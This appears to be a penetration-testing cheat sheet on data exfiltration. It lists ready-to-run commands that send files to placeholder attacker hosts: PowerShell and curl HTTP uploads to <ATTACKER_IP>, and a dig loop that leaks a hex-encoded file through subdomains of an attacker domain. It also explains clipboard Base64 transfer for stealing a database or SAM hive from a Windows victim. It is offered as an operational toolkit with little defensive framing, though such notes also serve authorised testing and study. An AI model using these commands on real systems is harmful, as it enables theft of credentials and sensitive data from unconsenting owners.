# Data Exfiltration
**Concept:** Getting data _out_ of the network. 
**Key Insight:** Most firewalls block _inbound_ traffic but allow _outbound_ traffic (HTTP/DNS/ICMP). We leverage these allowed channels to smuggle data.
## 1. HTTP/HTTPS Uploads (Standard)
**Scenario:** You have a web server running on your attack machine (e.g., `python3 -m http.server 8000` or a dedicated upload script).
### Windows (PowerShell)
**Method:** Encodes the file to Base64 (to handle binary data safely) and POSTs it to your listener.
```powershell
# 1. Read file and encode to Base64
$b64 = [System.convert]::ToBase64String((Get-Content -Path '<FILE_PATH>' -Encoding Byte))

# 2. Upload via POST
Invoke-WebRequest -Uri http://<ATTACKER_IP>:<PORT>/ -Method POST -Body $b64
```
### Linux (Curl)
**Method:** Standard multipart file upload.
```shell
# Standard Upload
curl -X POST http://<ATTACKER_IP>:<PORT>/upload -F 'files=@<FILE_PATH>'

# HTTPS Upload (Bypass Cert Warning)
# --insecure: Ignores self-signed certificate errors
curl -X POST https://<ATTACKER_IP>:<PORT>/upload -F 'files=@<FILE_PATH>' --insecure
```
## 2. Protocol Abuse (DNS & ICMP)
**Scenario:** TCP/UDP ports are blocked, but you can ping (ICMP) or resolve domains (DNS). 
**Warning:** These methods are extremely slow and noisy. Use only as a last resort.
### DNS Exfiltration (Hex Encoded)
**Concept:** Break the file into small chunks, hex-encode them, and use them as subdomains in DNS queries. The attacker's DNS server logs the queries to reconstruct the file.
```shell
# 1. Convert file to Hex (Continuous stream)
xxd -p <SECRET_FILE> > hex.txt

# 2. Loop through lines and query
# Resulting queries look like: <HEX_DATA>.attacker.com
for i in $(cat hex.txt); do dig $i.<ATTACKER_DOMAIN>; done
```
## 3. Manual Exfiltration (Base64 Copy-Paste)
**Scenario:** "Air-gapped" feel (RDP/Console access only). No file transfer tools work, but you have a shared clipboard.
### Encode (Source: Linux) -> Decode (Dest: Windows)
**Use Case:** Moving a tool from your Linux attacker machine to a Windows victim via clipboard.
```shell
# 1. Linux (Attacker): Encode file to one line
# -w 0: Disable line wrapping
cat <TOOL.exe> | base64 -w 0
# [Copy the output string]
```

```powershell
# 2. Windows (Victim): Decode back to binary
[IO.File]::WriteAllBytes("<OUTPUT_PATH>", [Convert]::FromBase64String("<PASTED_BASE64_STRING>"))
```
### Encode (Source: Windows) -> Decode (Dest: Linux)
**Use Case:** Stealing a database or SAM hive from a Windows victim to your Linux machine.
```powershell
# 1. Windows (Victim): Encode file
[Convert]::ToBase64String((Get-Content -path "<SENSITIVE_FILE>" -Encoding byte))
# [Copy the output string]
```

```shell
# 2. Linux (Attacker): Decode back to file
echo -n '<PASTED_BASE64_STRING>' | base64 -d > <OUTPUT_FILE>
```
## 4. Integrity Verification
**Context:** Always verify hashes after transfer. A corrupted exploit will crash the service; a corrupted binary won't run.
### Check MD5 Hash
```shell
# Linux (Source)
md5sum <FILE>
```

```powershell
# Windows (Destination)
Get-FileHash <FILE> -Algorithm md5
```